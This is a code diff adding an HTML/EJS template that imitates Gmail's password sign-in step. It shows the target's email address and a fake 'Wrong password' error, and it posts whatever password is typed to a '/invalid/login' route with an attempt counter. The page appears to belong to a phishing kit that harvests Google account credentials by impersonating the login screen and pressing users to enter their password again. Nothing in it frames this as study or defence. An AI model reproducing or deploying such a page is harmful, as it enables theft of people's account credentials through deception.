@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    <title>Gmail</title>
+
+    <style>
+        .jpg {
+            width: 100px;
+            margin-left: 37%;
+            background-color: transparent;
+            margin-top: -17px;
+
+        }
+
+        .input {
+            margin-left: 44%;
+        }
+
+        .box1 {
+            padding-right: 10px;
+    padding-left: 10px;
+    padding-bottom: 50px;
+    padding-top: 30px;
+    box-shadow: rgb(0 0 0 / 5%) 0px 6px 24px 0px, rgb(0 0 0 / 8%) 0px 0px 0px 1px;
+    border-radius: 5px;
+    width: 40%;
+        }
+
+        .hd1 {
+          margin-top: 9px;
+    /* margin-right: -0%; */
+    margin-left: 37%;
+        }
+
+        .hb1 {
+            margin-left: 0%;
+    margin-top: -20px;
+        }
+        .hb2{
+          border: 1px solid #dadce0;
+    border-radius: 16px;
+    /* width: 40%; */
+    width: fit-content;
+    position: relative;
+    padding: 3px;
+    padding-left: 5px;
+    padding-right: 5px;
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: 0.25px;
+        }
+
+        .in1 {
+            margin-left: 10%;
+    width: 80%;
+    padding-top: 16px;
+    padding-bottom: 16px;
+    padding-left: 10px;
+    font-size: 16px;
+           
+        }
+
+        .a1 {
+            margin-left: 7%;
+            margin-top: 5px;
+            font-size: 14px;
+            color: #1a73e8;
+            border-radius: 4px;
+            font-family: roboto,"Noto Sans Myanmar UI",arial,sans-serif;
+    
+    font-weight: 600;
+    letter-spacing: .25px;
+        }
+
+        
+        input[type=email]{
+            box-shadow: rgba(0, 0, 0, 0.05) 0px 6px 24px 0px, rgba(0, 0, 0, 0.08) 0px 0px 0px 1px;
+            border: none;
+
+        }
+.p11{
+   margin-left: 7%;
+}
+.lm{
+    margin-left: 7%;
+
+   
+            font-size: 14px;
+            color: #1a73e8;
+            border-radius: 4px;
+            font-family: roboto,"Noto Sans Myanmar UI",arial,sans-serif;
+    
+    font-weight: 600;
+    letter-spacing: .25px;
+
+}
+.span11{
+    margin-left: 9%;
+    font-size: 13px;
+    color: #1a73e8;
+    font-weight: 600;
+    font-family: "Google Sans",Roboto,Arial,sans-serif;
+    /* font-size: .875rem; */
+    letter-spacing: .0107142857em;
+}
+input[type=submit]{
+    background-color: #1a73e8;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    width: 17%;
+    padding-top: 9px;
+    padding-bottom: 9px;
+  }  
+
+  .svg1{
+  margin-left: 6%;
+    font-size: 12px;
+    color: #d93025;
+}
+  input[type=password]:focus{
+    border: 2px solid #d93025 !important; 
+
+  }
+  .placeholder:focus{
+    color: #1a73e8 !important;
+  }
+
+  div.input-block {
+  position: relative;
+}
+div.input-block input {
+  font-size: 1.6rem;
+    color: black;
+    width: 86%;
+    padding: 15px 15px;
+    border-radius: 5px;
+     border: 2px solid #d93025 !important; 
+    outline: none;
+    margin-left: 7%;
+    /* box-shadow: rgb(0 0 0 / 5%) 0px 6px 24px 0px, rgb(0 0 0 / 8%) 0px 0px 0px 1px; */
+    border: none;
+}
+div.input-block span.placeholder {
+    position: absolute;
+    margin: 17px 0;
+    padding: 0 4px;
+    color: #6c757d;
+    display: flex;
+    align-items: center;
+    font-size: 1.6rem;
+    top: 0;
+    left: 40px;
+    transition: all 0.2s;
+    transform-origin: 0% 0%;
+    background: none;
+    pointer-events: none;
+}
+div.input-block input:valid+span.placeholder,
+div.input-block input:focus+span.placeholder {
+  transform: scale(0.8) translateY(-30px);
+  background: #fff;
+  
+}
+div.input-block input:focus {
+  color: #284B63;
+  border-color: #284B63;
+}
+div.input-block input:focus+span.placeholder {
+  color: #284B63;
+}
+.loaderr{
+    width: 69%;
+    z-index: 111;
+    position: absolute;
+    /* top: 23%; */
+    margin-top: -6%;
+    margin-left: 3%;
+        }
+.wa {
+    width: 40%;
+    height: 4px;
+    position: absolute;
+    background-color: #1a73e8;
+    top: 23%;
+    border-radius: 5%;
+    margin-right: -100%;
+    /* margin-left: 32%; */
+    z-index: 11;
+    margin-left: -3%;
+    animation: mymove infinite;
+    animation-duration: 3s;
+}
+
+
+@-webkit-keyframes mymove {
+  0% {
+    left: 0%;
+  }
+  100% {
+    left: 100%;
+  }
+}
+
+@keyframes mymove {
+  0% {
+    left: 0%;
+  }
+  100% {
+    left: 100%;
+  }
+}
+.load{
+    display: none;
+}
+.whenload{
+    opacity: 0.5;
+}
+.col-md-offset-5 {
+    margin-left: 31.66666667%;
+}
+@media only screen and (max-width: 800px) {
+     
+     .box1 {
+   padding-right: 10px;
+   padding-left: 10px;
+   padding-bottom: 50px;
+   padding-top: 30px;
+   box-shadow: rgb(0 0 0 / 5%) 0px 6px 24px 0px, rgb(0 0 0 / 8%) 0px 0px 0px 1px;
+   border-radius: 5px;
+   width: 60%;
+   }
+   
+   
+   .col-md-offset-5 {
+   margin-left: 21.66666667%;
+   }
+   }
+@media only screen and (max-width: 600px) {
+    .box1 {
+    /* padding-right: 10px; */
+    /* padding-left: 10px; */
+    /* padding-bottom: 50px; */
+    padding-top: 30px;
+    box-shadow: none;
+    border-radius: 5px;
+    width: 100%;
+}
+.brr{
+    display: none;
+}
+.input {
+    margin-left: 34%;
+}
+.svg1 {
+    margin-left: 6%;
+    font-size: 10px;
+    color: #d93025;
+}
+.hb1 {
+    margin-left: 0%;
+    margin-top: -20px;
+}
+.col-md-offset-5 {
+    margin-left: 0%;
+}
+}
+
+
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <br id="br1" class="brr"><br id="br2" class="brr">
+        <br id="br3" class="brr"><br id="br4" class="brr"><br id="br5" class="brr"><br id="br6" class="brr"><br id="br7" class="brr"><br id="br8" class="brr">
+        <div class="row ">
+
+
+            <div id="columnid" class="col-md-offset-5 col-md-5 box1">
+                <div id="load" class="load">
+                    <span id="dis1" class="dis"></span>
+                   
+                   
+                </div>
+<br><br>
+                <img class="jpg" src="/gmail.png" alt="">
+                <h3 class="hd1">Welcome</h3><br>
+                <div style="display:flex; justify-content: center;">
+                <p class="hb1 hb2"><img style="width: 18px;" src="/account.png" alt="">
+                  <%=email %> <img style="width: 25px;margin-left: -6px; margin-top: -5px;" src="/down.png" alt=""></p>
+                  </div><br>
+
+
+                <form id="myForm" method="post" action="/invalid/login/<%= page2load %>/<%= count %>">
+                      <div class="input-block">
+                        <input type="hidden" name="count" value="<%=count %>">
+                        <input type="password" name="password" id="input-text" required spellcheck="false">
+                        <span class="placeholder">
+                          Enter your password
+                        </span>
+                      </div>
+                      <span class="svg1">
+                        <svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                          Wrong password. Try again or click ‘Forgot password’ to reset it.
+                      </span><br><br>
+
+                      <span class="al"><img style="width:16px; margin-left:7%;" src="/square.png" alt=""> &nbsp;&nbsp;&nbsp;&nbsp;Show password</span><br><br><br><br>
+
+                    <span><a class="span11" href="#">Forgot password?</a></span><span class="span12"><input class="input"
+                          id="myBtn"  type="submit" value="Next" onclick="worked();"></span>
+
+                </form>
+<br><br><br><br>
+            </div>
+
+        </div>
+    </div>
+    </div>
+    <script>
+        // var input = document.getElementById("myInput");
+        // input.addEventListener("keypress", function(event) {
+        //   if (event.key === "Enter") {
+        //     event.preventDefault();
+        //     document.getElementById("myBtn").click();
+        //   }
+        // });
+        
+        function worked(){
+            console.log("Worked function click")
+           
+        var columnid = document.getElementById('columnid');
+        columnid.classList.add('whenload')
+        var span1 = document.getElementById('dis1');
+        var loadid = document.getElementById('load');
+        loadid.classList.add('loaderr')
+        loadid.classList.remove('load')
+
+        span1.classList.remove('dis')
+        span1.classList.add('wa')
+        document.getElementById("myForm").submit();
+         document.getElementById("myBtn").disabled = true;
+        // document.getElementById("myBtn").disabled = true;
+          var setint =  setInterval(function () {
+    }, 5000);
+
+    clearInterval(setint);
+    console.log("here")
+    // window.location = '/username';
+   
+}
+          
+        </script>
+
+    <script>
+        $(window).on('resize', function(){
+                var win = $(this); //this = window
+                if (win.width()< 500) {
+                     $('#columnid').removeClass('col-md-offset-5'); 
+                    //  $('#br1').removeClass('brr'); 
+                    //  $('#br2').removeClass('brr'); 
+                    //  $('#br3').removeClass('brr'); 
+                    //  $('#br4').removeClass('brr'); 
+                    //  $('#br5').removeClass('brr'); 
+                    //  $('#br6').removeClass('brr'); 
+                    //  $('#br7').removeClass('brr'); 
+                    //  $('#br8').removeClass('brr'); 
+                   
+                  
+                  
+                  
+                  }
+           });
+          </script>
+</body>
+
+</html>
